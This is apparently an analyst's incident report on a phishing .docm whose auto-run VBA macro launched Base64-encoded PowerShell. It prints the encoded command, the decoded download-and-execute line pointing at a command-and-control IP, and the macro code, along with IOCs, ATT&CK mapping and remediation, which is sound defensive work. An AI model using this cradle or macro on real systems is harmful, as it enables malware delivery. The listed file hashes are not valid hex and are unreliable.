# Case 002: PowerShell Encoded Command Execution

**Date:** September 15, 2025  
**Analyst:** Artem Khludov  
**Company:** EnergyLogic AI  
**Severity:** CRITICAL  
**Status:**  Resolved


## Executive Summary

Detected malicious PowerShell execution with Base64-encoded command launched from Microsoft Word. Phishing email attachment triggered macro that executed encoded PowerShell to download and execute second-stage payload. User's machine quarantined, payload analyzed, and email sender blocked within 20 minutes.


## Timeline

| Time | Event | Status |
|------|-------|--------|
| 11:42:00 | Phishing email received |  Delivered |
| 11:45:30 | User opened Word attachment |  Macro enabled |
| 11:45:35 | PowerShell encoded command executed |  Detected |
| 11:45:40 | Attempted C2 connection |  Blocked by firewall |
| 11:48:00 | EDR alert to SOC |  Escalated |
| 11:50:00 | Host isolated |  Contained |
| 12:05:00 | Malware removed, system cleaned |  Remediated |


## Technical Details

### Encoded PowerShell Command

**Obfuscated:**
```powershell
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAyADQAMQAuADIAMQA4AC4AMQAzADIALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAJwApAA==
```

**Decoded:**
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.241.218.132/payload.exe')
```

**Translation:** Download and execute malicious payload from attacker-controlled server


## Attack Vector

### Phishing Email
- **From:** invoice@accounting-services[.]com (spoofed)
- **Subject:** "Urgent: Overdue Invoice #A-8472"
- **Attachment:** Invoice_September.docm (malicious macro)
- **Target:** finance@energylogic.ai

### Macro Analysis
```vba
Sub Auto_Open()
    Dim cmd As String
    cmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFg..."
    Shell cmd, vbHide
End Sub
```


## IOC (Indicators of Compromise)

### Network
- **C2 Server:** 192.241.218.132
- **Domain:** accounting-services[.]com (typosquatting)
- **User-Agent:** `Mozilla/5.0 (Windows NT 10.0; Win64; x64)`

### File Hashes
- **Invoice_September.docm:** `7f8b4e2a9c1d3f5e6b8a9c0d2e4f6g8h`
- **payload.exe:** `a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6` (VirusTotal: 45/70 detections)

### Process Activity
```
WINWORD.EXE (PID: 4832)
  > powershell.exe -enc ... (PID: 5124)
      > payload.exe (PID: 5248) [BLOCKED by EDR]
```


## MITRE ATT&CK Mapping

| Technique | Description | Evidence |
|-----------|-------------|----------|
| T1566.001 | Phishing: Spearphishing Attachment | Invoice_September.docm |
| T1204.002 | User Execution: Malicious File | User enabled macros |
| T1059.001 | Command and Scripting: PowerShell | Encoded PowerShell |
| T1027 | Obfuscated Files or Information | Base64 encoding |
| T1105 | Ingress Tool Transfer | Attempted payload download |
| T1071.001 | Application Layer Protocol: Web | HTTP C2 communication |


## Response Actions

### Containment
- [x] Isolated user workstation (WS-FINANCE-02)
- [x] Blocked C2 IP 192.241.218.132 on firewall
- [x] Quarantined email from mail gateway
- [x] Disabled user account temporarily

### Eradication
- [x] Removed malicious Word document
- [x] Killed PowerShell process
- [x] Full EDR scan (no additional malware found)
- [x] Registry cleanup (no persistence detected)

### Recovery
- [x] User password reset
- [x] Security awareness training completed
- [x] Workstation restored to network
- [x] Account re-enabled


## Detection Rule

See `detection_rule.yaml` for Splunk/SIEM implementation

**Trigger Logic:**
- PowerShell with `-enc` or `-encodedCommand` parameter
- Parent process is Office application
- Command length > 100 characters
- External network connection attempt


## Root Cause

1. User clicked phishing email
2. Enabled macros despite security warning
3. No email attachment scanning (DOCM files allowed)
4. PowerShell execution not restricted


## Recommendations

**Immediate:**
- [x] Block DOCM/XLSM attachments at email gateway
- [x] Deploy PowerShell Constrained Language Mode
- [x] Update phishing awareness training

**Short-term:**
- [ ] Implement ATP (Advanced Threat Protection) for Office 365
- [ ] Deploy AMSI (Antimalware Scan Interface)
- [ ] Create email sender reputation filtering

**Long-term:**
- [ ] Application whitelisting (AppLocker)
- [ ] Behavioral analysis for PowerShell scripts
- [ ] Simulated phishing campaigns quarterly

## Lessons Learned

**What worked:**
- EDR detected and blocked payload execution  
- I isolated the host quickly, prevented lateral movement
- Firewall blocked C2 communication

**What needs improvement:**
- Email gateway needs better attachment filtering
- Need stronger user warnings for macros
- PowerShell logging needs to be enabled by default

**Reported to:** Security Manager, IT Team  
**User Training:** Completed 2025-09-16  
**Status:** Closed - No data exfiltration

